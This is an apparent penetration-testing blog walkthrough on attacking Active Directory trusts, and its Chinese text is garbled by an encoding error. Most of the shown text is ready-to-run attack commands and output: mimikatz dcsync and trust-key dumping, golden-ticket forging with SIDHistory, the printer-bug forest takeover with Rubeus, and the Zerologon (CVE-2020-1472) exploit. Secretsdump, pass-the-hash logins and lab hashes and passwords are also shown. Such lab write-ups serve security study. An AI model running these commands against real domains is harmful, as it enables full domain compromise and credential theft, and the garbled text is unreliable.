title="è·¨åŸŸæ”»å‡»åˆ†æåŠé˜²å¾¡"></a>è·¨åŸŸæ”»å‡»åˆ†æåŠé˜²å¾¡</h2><h3 id="åŸŸé—´ä¿¡ä»»æ¦‚è¿°"><a href="#åŸŸé—´ä¿¡ä»»æ¦‚è¿°" class="headerlink" title="åŸŸé—´ä¿¡ä»»æ¦‚è¿°"></a>åŸŸé—´ä¿¡ä»»æ¦‚è¿°</h3><p><strong>ä¸ºä»€ä¹ˆä¼šæœ‰åŸŸä¿¡ä»»?</strong></p><p>åœ¨åŒä¸€ä¸ªåŸŸå†…ï¼Œç®¡ç†å‘˜å¯ä»¥å®ç°èµ„æºçš„ç»Ÿä¸€ç®¡ç†ã€åˆ†é…ã€‚æœ‰äº›ä¼ä¸šä¼šç”¨åˆ°å¤šä¸ªåŸŸï¼Œåˆ›å»ºåŸŸé—´ä¿¡ä»»å¯ä»¥æ–¹ä¾¿è·¨åŸŸèµ„æºåˆ†é…ã€‚</p><p><strong>ä¿¡ä»»æ˜¯æœ‰æ–¹å‘çš„:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707170708834.png" alt="image-20220707170708834"></p><p><strong>ä¿¡ä»»ä¼ é€’:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707170843465.png" alt="image-20220707170843465"></p><p><strong>åŸŸæ ‘å’ŒåŸŸæ—:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171001846.png" alt="image-20220707171001846"></p><p><strong>åŸŸé—´ä¿¡ä»»å®ä¾‹:</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171110376.png" alt="image-20220707171110376"></p><p><strong>åŸŸé—´ä¿¡ä»»åˆ†ç±»</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171153927.png" alt="image-20220707171153927"></p><h3 id="åŸŸé—´ä¿¡ä»»ä¿¡æ¯æ”¶é›†ã€åˆ©ç”¨æ€è·¯"><a href="#åŸŸé—´ä¿¡ä»»ä¿¡æ¯æ”¶é›†ã€åˆ©ç”¨æ€è·¯" class="headerlink" title="åŸŸé—´ä¿¡ä»»ä¿¡æ¯æ”¶é›†ã€åˆ©ç”¨æ€è·¯"></a>åŸŸé—´ä¿¡ä»»ä¿¡æ¯æ”¶é›†ã€åˆ©ç”¨æ€è·¯</h3><p><strong>ç¯å¢ƒæ­å»º</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707171848435.png" alt="image-20220707171848435"></p><p><strong>æŸ¥çœ‹åŸŸé—´ä¿¡ä»»</strong></p><p>å‘½ä»¤:</p><pre><code class="shell">nltest /domain_trusts  /primary ä»…è¿”å›è®¡ç®—æœºè´¦æˆ·å±äºçš„åŸŸ # å¦‚nltest /domain_trusts /primary/forest ä»…è¿”å›ä¸»åŸŸåŒä¸€æ£®æ—ä¸‹çš„åŸŸ/direct_out è¿”å›è¢«ä¸»åŸŸæ˜ç¡®ä¿¡ä»»çš„åŸŸ/direct_in è¿”å›æ˜ç¡®ä¿¡ä»»ä¸»åŸŸçš„åŸŸ/all_trusts è¿”å›æ‰€æœ‰å·²ä¿¡ä»»çš„åŸŸ/V æ˜¾ç¤ºè¯¦ç»†çš„è¾“å‡ºï¼ŒåŒ…æ‹¬åŸŸçš„SIDså’ŒGUIDs</code></pre><pre><code>netdom query trust #åªèƒ½åœ¨åŸŸæ§ä¸Šä½¿ç”¨</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711230039383.png" alt="image-20220711230039383"></p><p><strong>å·¥å…·:</strong></p><p><strong>æ”¶é›†åŸŸè¯¦ç»†ä¿¡æ¯:</strong></p><p>powerview</p><p>ä¸‹è½½é“¾æ¥:<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>ä¸€èˆ¬ä¸å…è®¸æ‰§è¡Œï¼Œå¯ä½¿ç”¨ISESteroidsæ¨¡å—ç»•è¿‡</p><pre><code class="shell">PowerShell.exe -ExecutionPolicy Bypass -command &quot;..\powerview.ps1;Get-NetDomainTrust&quot;</code></pre><p>adfindï¼š</p><p>ä¸‹è½½é“¾æ¥:<a href="http://www.joeware.net/freetools/tools/adfind/">http://www.joeware.net/freetools/tools/adfind/</a></p><ul><li>-appverï¼šæ˜¾ç¤ºadfindç‰ˆæœ¬ä¿¡æ¯</li><li>-bï¼šæŒ‡å®šè¦æŸ¥è¯¢çš„æ ¹èŠ‚ç‚¹basedn</li><li>-bitï¼šæŒ‡å®šä½æŸ¥è¯¢</li><li>-c:  åªç»Ÿè®¡æ•°é‡</li><li>-csvï¼šå¯¼å‡ºä¸ºcsvæ ¼å¼</li><li>-dnï¼šåªæ˜¾ç¤ºdnï¼Œä¸è¿”å›è¯¦ç»†ä¿¡æ¯</li><li>-fï¼šLDAPè¿‡æ»¤æ¡ä»¶ï¼ŒæŒ‡å®šldapè¯­æ³•</li><li>-hï¼šæŒ‡å®šä¸»æœºä¸ç«¯å£(ip:port)</li><li>-recmuteï¼šåˆ é™¤dnä¸‹é¢æ²¡æœ‰çš„</li><li>-sï¼šæœç´¢çš„èŒƒå›´ï¼Œ æœ‰ one(å½“å‰å±‚çº§)/sub(ä¸€å±‚ä¸€å±‚é€’å½’)ï¼Œé»˜è®¤æ˜¯sub</li><li>-sdnaï¼šéåŸŸç®¡æŸ¥è¯¢sdä¿¡æ¯</li><li>-tï¼šæŸ¥è¯¢è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤120ç§’</li><li>-uï¼šæŒ‡å®šç”¨æˆ·</li><li>-upï¼šæŒ‡å®šç”¨æˆ·çš„å¯†ç </li></ul><pre><code>adfind.exe -h ip -sc u:* #å¦‚ AdFind.exe -h WIN-OSOIFGPM536.sakura.com -sc u:Administrator</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710000000436.png" alt="image-20220710000000436"></p><p>adexplorer</p><p>ä¸‹è½½é“¾æ¥:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer">https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer</a></p><p>è¾“å…¥åŸŸæ§çš„è´¦å·å¯†ç å°±å¯ä»¥è¿›è¡Œç®¡ç†</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710092143570.png" alt="image-20220710092143570"></p><p><strong>æ”¶é›†åŸŸç½‘ç»œä¿¡æ¯:</strong></p><p>nltestã€pingã€dnscmd</p><pre><code>nltest /domain_trustsnltest /dclist:companyping sakura.comdnscmd /enumzones</code></pre><p><strong>åˆ©ç”¨æ€è·¯</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710093631488.png" alt="image-20220710093631488"></p><h3 id="è·¨åŸŸæ”»å‡»"><a href="#è·¨åŸŸæ”»å‡»" class="headerlink" title="è·¨åŸŸæ”»å‡»"></a>è·¨åŸŸæ”»å‡»</h3><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094448657.png" alt="image-20220710094448657"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094713427.png" alt="image-20220710094713427"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094732640.png" alt="image-20220710094732640"></p><h4 id="SIDHistoryä»‹ç»å’Œåˆ©ç”¨"><a href="#SIDHistoryä»‹ç»å’Œåˆ©ç”¨" class="headerlink" title="SIDHistoryä»‹ç»å’Œåˆ©ç”¨"></a>SIDHistoryä»‹ç»å’Œåˆ©ç”¨</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710094901181.png" alt="image-20220710094901181"></p><p><strong>åˆ©ç”¨åŸŸä¿¡ä»»å¯†é’¥è·å–ç›®æ ‡åŸŸæƒé™</strong></p><ul><li><p>å­˜åœ¨ä¿¡ä»»è´¦æˆ·çš„æƒ…å†µä¸‹ï¼šDcsyncè·å–ä¿¡ä»»è´¦å·çš„NTLMå€¼</p></li><li><pre><code>Get-ADUser -Filter &#123;samAccountName -like &quot;*$&quot;&#125; #å¦‚ä½•æ— æ³•æ‰¾åˆ°Get-ADuserå‘½ä»¤ï¼Œåˆ™å¯¼å…¥æ¨¡å— import-module activedirectory</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711231847885.png" alt="image-20220711231847885"></p><ul><li><pre><code class="shell">.\mimikatz.exe &quot;lsadump::dcsync /user:sakura$@HY.sakura.com&quot; exit</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711231746078.png" alt="image-20220711231746078"></p><hr><ul><li><p>å†…éƒ¨ä¿¡ä»»:lsadumpè·å–ä¿¡ä»»è´¦å·çš„NTLMå€¼</p></li><li><pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:sakura$&quot; &quot;lsadump::trust /patch&quot; exit</code></pre></li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711232854715.png" alt="image-20220711232854715"></p><p><strong>ä¿¡ä»»ç¥¨æ®çš„åˆ›å»º</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220710102754875.png" alt="image-20220710102754875"></p><pre><code class="shell">.\mimikatz.exe &quot;Kerberos::golden /domain:HY.sakura.com /sid:S-1-5-21-3349743833-377928606-3985385106 /sids:S-1-5-21-1090921569-2929606133-4003408593-519 /rc4:56de60dc2e57db6b03fc5e9834965f26 /user:sakura /service:krbtgt /target:sakura.com /ticket:sakura.kirbi&quot; #/ticketåé¢çš„å«ä¹‰æ˜¯ä¿å­˜çš„æ–‡ä»¶å</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235022847.png" alt="image-20220711235022847"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235119876.png" alt="image-20220711235119876"></p><p>æˆ‘ä»¬å…ˆçœ‹ï¼Œç›®å‰æ˜¯æ— æ³•è®¿é—®çˆ¶åŸŸèµ„æºçš„</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220711235628387.png" alt="image-20220711235628387"></p><p><strong>TGSè·å–å’Œåˆ©ç”¨</strong></p><pre><code>.\asktgs.exe C:\Users\Administrator\Desktop\sakura.kirbi CIFS/fy.sakura.com</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000226225.png" alt="image-20220712000226225"></p><pre><code class="shell">.\kirbikator.exe lsa .\CIFS.fy.sakura.com.kirbi</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000341715.png" alt="image-20220712000341715"></p><p>ç„¶åå°±å¯ä»¥æˆåŠŸå¯¹å­åŸŸè¿›è¡Œæ“ä½œäº†</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712000536307.png" alt="image-20220712000536307"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712001240811.png" alt="image-20220712001240811"></p><h4 id="åˆ©ç”¨krbtgtæ•£åˆ—è·å–ç›®æ ‡åŸŸæƒé™"><a href="#åˆ©ç”¨krbtgtæ•£åˆ—è·å–ç›®æ ‡åŸŸæƒé™" class="headerlink" title="åˆ©ç”¨krbtgtæ•£åˆ—è·å–ç›®æ ‡åŸŸæƒé™"></a>åˆ©ç”¨krbtgtæ•£åˆ—è·å–ç›®æ ‡åŸŸæƒé™</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712110239522.png" alt="image-20220712110239522"></p><p><strong>kebtgtæ•£åˆ—è·å–</strong></p><pre><code class="shell">privilege::debuglsadump::lsa /patch /user:krbtgtsekurlsa::krbtgtexit</code></pre><p>æˆ–è€…ç›´æ¥åˆå¹¶æˆä¸€å¥è¯</p><pre><code>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:krbtgt&quot; &quot;sekurlsa::krbtgt&quot; &quot;exit&quot;</code></pre><p><strong>æ„é€ å¹¶æ³¨å…¥é»„é‡‘ç¥¨æ®</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712111832854.png" alt="image-20220712111832854"></p><pre><code class="shell">.\mimikatz.exe &quot;Kerberos::golden /user:administrator /domain:HY.sakura.com /sid:S-1-5-21-3349743833-377928606-3985385106 /sids:S-1-5-21-1090921569-2929606133-4003408593-519 /krbtgt:803b57a2a73cdc03133e631db7f506ad /ptt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712111644256.png" alt="image-20220712111644256"></p><h3 id="æ—ä¿¡ä»»æ”»å‡»"><a href="#æ—ä¿¡ä»»æ”»å‡»" class="headerlink" title="æ—ä¿¡ä»»æ”»å‡»"></a>æ—ä¿¡ä»»æ”»å‡»</h3><p>æˆ‘è¿™é‡Œè®¾ç½®ä¸¤ä¸ªåŸŸ:</p><p>sakura.comã€salmon.com</p><p>ä¸€å° ly-1 å¯†ç :yk2012.com</p><p>ä¸€å° ly-2 å¯†ç :yk-22012.com</p><h4 id="MS-RPPRNè·å–ä¿¡ä»»æ—æƒé™"><a href="#MS-RPPRNè·å–ä¿¡ä»»æ—æƒé™" class="headerlink" title="MS-RPPRNè·å–ä¿¡ä»»æ—æƒé™"></a>MS-RPPRNè·å–ä¿¡ä»»æ—æƒé™</h4><p><strong>åˆ©ç”¨æ¡ä»¶</strong>:éœ€è¦è®¾ç½®ä¸€å°ä¸»æœºè´¦æˆ·å¼€å¯äº†éçº¦æŸå§”æ´¾åŸŸå†…æœºå™¨çš„æƒé™ï¼Œå®é™…å¯é…åˆpowerviewè„šæœ¬æŸ¥æ‰¾ä¸»æœºï¼ŒåŸŸæ§ä¸»æœºéœ€è¦ä¸ºwin2012 server r2 ä»¥ä¸Š ç‰ˆæœ¬ï¼ŒPrint SpooleræœåŠ¡é»˜è®¤æ˜¯è‡ªåŠ¨è¿è¡Œçš„</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712112745485.png" alt="image-20220712112745485"></p><p><strong>å®éªŒåœºæ™¯:</strong></p><ul><li>å·²è·å¾—ä¸€ä¸ªæ—çš„æƒé™(EA).ã€‚æœ¬ä¾‹ä¸ºsakura.com</li><li>é…ç½®äº†æ— çº¦æŸå§”æ´¾çš„ã€å·²è¢«æ”»å‡»è€…æ§åˆ¶çš„ä¸€å°æœåŠ¡å™¨(ly-1.sakura.com)</li><li>åœ¨æ¼”ç¤ºæ¡ˆä¾‹ä¸­ï¼Œæ”»å‡»è€…å…¥ä¾µäº†æ ¹åŸŸçš„åŸŸæ§åˆ¶å™¨(DC),åˆ©ç”¨è¯¥DCæ”»å‡»å¦ä¸€ä¸ªåŸŸæ—ä¸­çš„å¦ä¸€ä¸ªDC</li><li>ç›®æ ‡åŸŸæ—:æœ¬ä¾‹ä¸­ä¸ºsalmon.com</li></ul><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713162710957.png" alt="image-20220713162710957"></p><p><strong>æ”»å‡»ç¤ºæ„å›¾</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712150156656.png" alt="image-20220712150156656"></p><p><strong>åˆ©ç”¨å·¥å…·</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220712150254348.png" alt="image-20220712150254348"></p><pre><code class="shell">.\Rubeus.exe monitor /interval:5 /filteruser:ly-2$</code></pre><p>intervalå‚æ•°ç”¨äºè®¾ç½®ç›‘æ§çš„æ—¶é—´é—´éš”ï¼Œå•ä½ä¸ºç§’ï¼›filteruserç”¨äºæŒ‡å®šæ¸—é€æµ‹è¯•ä¸­éœ€è¦å…³æ³¨çš„ç”¨æˆ·</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713160424988.png" alt="image-20220713160424988"></p><pre><code class="shell">.\SpoolSample.exe ly-2.salmon.com ly-1.sakura.com</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713155559395.png" alt="image-20220713155559395"></p><p>æ­¤æ—¶rubeusç›‘å¬åˆ°äº†TGT</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713160359007.png" alt="image-20220713160359007"></p><p>ä½¿ç”¨Rubeuså·¥å…·ç›´æ¥æŠŠbase64å­—ç¬¦ä¸²å¯¼å…¥ç¥¨æ®ï¼š</p><pre><code class="shell">.\Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIBBaEDAgEWooIEBjCCBAJhggP+MIID+qADAgEFoQwbClNBTE1PTi5DT02iHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbClNBTE1PTi5DT02jggPCMIIDvqADAgESoQMCAQKiggOwBIIDrBG1txlv0N5lRuOFLSbrz8uiCgjf4LwfNvlgi5p0Q80N4A9p301eRDthpV4Bwd7JCHjL7tQ/gZNU3cbA6PO3YCpg5AiVYcR7OnvfIU2LByxKN2iA4YMXRTIhFJZlRiuu4Wh2CQVbDHM+WR8rTHwnAetzq9uOkUrL7HiyK09IT1dmaQS5z7jm3WoRiSfqzfqrqpkrYUXHrKTNmeqdOxX9moYgpsFjKXwMZdHVcmnDLndt147OhMQfFOKwiVtN29YH/rvbmJnrYVLu6ZWZZpi7bj/bXY9pY8GeoNGxJMVZbiULiRnfToi0Db8DMpo115omCnsX7qfquZp5NmbyzO2/V1jknoUQ6k2qIvF+bvjydlh1PciiWxosTAMbD6bJMvwUUT78DZN6IRW9Dg0p3PgVexL73/BwCJ8f89cMzdXh7kZHm/ozhJI9uf1p0v9J2tu0g3flGDo+MF+VZBYBgVXNHiCM1oQGuEPI0Lx2Xs1JR5CCq4HdGh0tNgBIc7ppYg9W8S+6OfZU8dyQdtFh2Rc76CNHEipCzCZYBTctIJ5IV02oPzTM3lvQrbd2BsDBpWPqlV3u/7r5vm2ywp81yA2n7ZCYrZP+F9NP46IXIQ0hKT9VKoNf5ODqbH7H+0bfZogAMuMNN7Bs746NyC7qjhUbRWlmtRNfSlNqaHvsXdzcG7s87gTO9bS0v4Vxxf1ZFGnjsXfia/zvjIFymUdTJzak86FjyCj9HzxWmnSnImwT2WShnWex+S5PfOnuH7Mu8hSe/riKpdK1HdrRL3hBhhsT+vE3HNmLr7DIF0iZ5523Fibp0tOAgGf0LABdHa60anzlOSR5k2gWLSa4JifMxjohaQ5VUt3af6hewd67ZuTL9afVJyvYgAhjOsG7WEPJ1xgN3kOSp9KO+gZV7h9nKEeSScCaIDp5N29fU9CSxOzfQwct7i12BJwSGCK17S3M84v3DSXZWHmq891p2rw4Sr8BBEOE0FDfRhdnboNzkQ5Qf7CS2pafxLxtfQDiWKu2JQdRzNrLkb30zTBG4/uY/o9TBiN5mPSOPSjEqKVurkU3T0M1mYGaX9S0NdppQHKTMDEFdSMY58YzQ25PaEqMqUlvwI0V8c4cVRHsAtefz8GPfHS1I5ENB0OsSoRmWfel0T9/XX7gUjxgf4pQDYzLKb+WZm2fVMKVfB+U2kLcDC3oQ2wnRkmAYLYxJrKOVJRQVlPbIwhCsaP0JYX658qEA6BO9DjhJbz4jfXzOL+TH7ejgd0wgdqgAwIBAKKB0gSBz32BzDCByaCBxjCBwzCBwKArMCmgAwIBEqEiBCAsySonk73tkRU5Ja0UNRWW/zhAgUSZuBym4G3BFO7qKqEMGwpTQUxNT04uQ09NohIwEKADAgEBoQkwBxsFTFktMiSjBwMFAGChAAClERgPMjAyMjA3MTMwNzM0NDRaphEYDzIwMjIwNzEzMTczNDQ0WqcRGA8yMDIyMDcxMzE3MzQ0NFqoDBsKU0FMTU9OLkNPTakfMB2gAwIBAqEWMBQbBmtyYnRndBsKU0FMTU9OLkNPTQ==</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713163130505.png" alt="image-20220713163130505"></p><pre><code class="shell">.\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:salmon.com /user:krbtgt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713163220750.png" alt="image-20220713163220750"></p><pre><code class="shell">.\mimikatz.exe &quot;kerberos::list&quot; exit.\mimikatz.exe &quot;kerberos::purge&quot; exit.\mimikatz.exe &quot;kerberos::list&quot; exit.\mimikatz.exe &quot;kerberos::golden /user:administrator /domain:salmon.com /sid:S-1-5-21-3200352805-2293635123-428118185 /rc4:8da01a075e60007f23b3ce18b77b9a0f /ptt&quot; exit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713164513444.png" alt="image-20220713164513444"></p><p><strong>è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œå‘½ä»¤æ‰§è¡Œ</strong></p><pre><code>.\mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:salmon.com /all /csv&quot; exit</code></pre><p>è·å¾—ä¿¡æ¯:</p><pre><code class="shell">1104    SAKURA$ 76771a6354707379eb4bfd77a28224e5        20801001    LY-2$   0d9a393377c2f46a3b2a20a95954e540        532480500     Administrator   8168027b15e25c5d6ad39528429229d6        512502     krbtgt  8da01a075e60007f23b3ce18b77b9a0f        514</code></pre><pre><code>python3 ./wmiexec.py -hashes ad3b435b51404eeaad3b435b51404ee:8168027b15e25c5d6ad39528429229d6 ly-2.salmon.com/administrator@192.168.64.151</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713171855227.png" alt="image-20220713171855227"></p><h4 id="æ‰©å±•-CVE-2020-1472-windowsåŸŸæ§ææƒ"><a href="#æ‰©å±•-CVE-2020-1472-windowsåŸŸæ§ææƒ" class="headerlink" title="æ‰©å±• CVE-2020-1472 windowsåŸŸæ§ææƒ"></a>æ‰©å±• CVE-2020-1472 windowsåŸŸæ§ææƒ</h4><p>CVE-2020-1472 æ˜¯â¼€ä¸ª windows åŸŸæ§ä¸­ä¸¥é‡çš„è¿œç¨‹æƒé™æå‡æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ NetLogonï¼Œå»ºâ½´ä¸åŸŸæ§é—´æ˜“å—æ”»å‡»çš„å®‰å…¨é€šé“æ—¶ï¼Œå¯åˆ©â½¤æ­¤æ¼æ´è·å–åŸŸç®¡è®¿é—®æƒé™ï¼ˆå°†åŸŸæ§ä¸­ä¿å­˜åœ¨ADä¸­çš„ç®¡ç†å‘˜passwordè®¾ç½®ä¸ºç©ºï¼‰ï¼›å…¶æ¼æ´åŸç†æ˜¯å‘â½£åœ¨ RPC è®¤è¯è¿‡ç¨‹çš„è¿‡ç¨‹ä¸­ï¼Œç”±äºé”™è¯¯çš„ä½¿â½¤äº† AES-CFB8 åŠ å¯†æ‰€å¯¼è‡´æ¼æ´æˆå› ï¼Œè¯¥æ¼æ´é€‚â½¤äº Win2008 åçš„æ‰€æœ‰ç‰ˆæœ¬</p><p>åˆ©ç”¨åœºæ™¯ï¼šè·å–äº†ä¸€ä¸ªåŠ å…¥äº†åŸŸçš„è®¡ç®—æœºæƒé™ï¼Œåœ¨åŸŸæ™®é€šè´¦å·çš„æƒ…å†µä¸‹ï¼Œå°†åŸŸç®¡å¯†ç ç½®ç©ºï¼Œå¯¼å‡ºåŸŸç®¡hashï¼Œç„¶åè¿›è¡Œè¿æ¥ </p><p>psï¼šåœ¨å®æˆ˜ç¯å¢ƒä¸­ï¼Œç”±äºä¼šæŠŠåŸŸæ§æœºå™¨çš„è´¦æˆ·å’Œå¯†ç æ¸…ç©ºï¼Œæ‰€ä»¥æœ‰å¯èƒ½ä¼šå¯¼è‡´åŸŸå†…å‡ºé—®é¢˜ï¼Œå¯èƒ½å¯¼è‡´æŸäº›æœåŠ¡â½†æ³•æ­£å¸¸è¿â¾ï¼Œä¸¥é‡ä¼šé€ æˆè„±åŸŸç­‰æƒ…å†µï¼Œè¯·è°¨æ…åˆ©â½¤ã€‚</p><p>å‰ç½®æ¡ä»¶ï¼šç›®æ ‡åŸŸæ§å­˜åœ¨æ­¤æ¼æ´æœªæ‰“è¡¥ä¸ï¼Œè¿™ä¸ªæ¼æ´ç”¨åˆ°äº†MS-NRPCåè®®ï¼Œç”¨åˆ°äº†135ç«¯å£</p><p>æ³¨æ„ï¼šåœ¨æ£€æµ‹æˆ–è€…æ‰§è¡Œexpçš„æ—¶å€™ï¼Œæ‰€åœ¨ä¸»æœºä¸ä¸€å®šåŠ å…¥åŸŸç¯å¢ƒä¸­ï¼Œåœ¨æ¶‰åŠåŸŸè§£æçš„æ—¶å€™ç›´æ¥åœ¨hostsé‡Œé¢è®¾ç½®åŸŸåå¯¹åº”ipå°±è¡Œ</p><p>å¤ç°æ­¥éª¤:</p><p>é¦–å…ˆè·å–ä¸»æœºå:</p><pre><code class="shell">nbtstat -A 192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713221143362.png" alt="image-20220713221143362"></p><p><strong>æ¢æµ‹æ˜¯å¦å­˜åœ¨æ¼æ´:</strong></p><p>é“¾æ¥:<a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713223158821.png" alt="image-20220713223158821"></p><p><strong>å­˜åœ¨æ¼æ´ï¼Œä¸‹ä¸€æ­¥æ‹¿expå»æ‰“</strong></p><p>expé“¾æ¥:<a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></p><pre><code class="shell">python3 cve-2020-1472-exploit.py ly-1 192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713223643646.png" alt="image-20220713223643646"></p><p><strong>å¯¼å‡ºå¯†ç </strong></p><pre><code class="shell">python3 secretsdump.py sakura.com/ly-1\$@192.168.64.150    -no-pass &gt; ~/Desktop/pass.txt</code></pre><p>ps:kali $å‰è¦åŠ ä¸ªè½¬ä¹‰ç¬¦å·ï¼</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713230309872.png" alt="image-20220713230309872"></p><p><strong>è¿æ¥ä¸Šå»</strong></p><pre><code class="shell">python3 ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:07d312335be3ab7eceda2a6d341e5cbb ly-1.sakura.com/administrator@192.168.64.150</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713230637115.png" alt="image-20220713230637115"></p><p>æˆåŠŸè¿æ¥</p><p><strong>æ¢å¤åŸŸæ§åŸå§‹hash</strong></p><pre><code class="shell">reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.savelget system.savelget sam.savelget security.save</code></pre><p><strong>åˆ é™¤æ–‡ä»¶</strong></p><pre><code class="shell">del /f system.savedel /f sam.savedel /f security.save</code></pre><p><strong>é€šè¿‡ sam.saveã€security.saveã€system.save è¿™äº›â½‚ä»¶è·å¾—åŸæ¥åŸŸæ§æœºå™¨ä¸Šçš„ Ntlm Hash å€¼ï¼Œâ½¤äºæ¢å¤å¯†ç </strong></p><pre><code class="shell">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220713234613032.png" alt="image-20220713234613032"></p><p><strong>é€šè¿‡æ‹¿åˆ° $MACHINE.ACC: çš„å€¼ï¼Œç„¶åè¿›â¾æ¢å¤</strong></p><p>è„šæœ¬ä¸‹è½½ï¼š<a 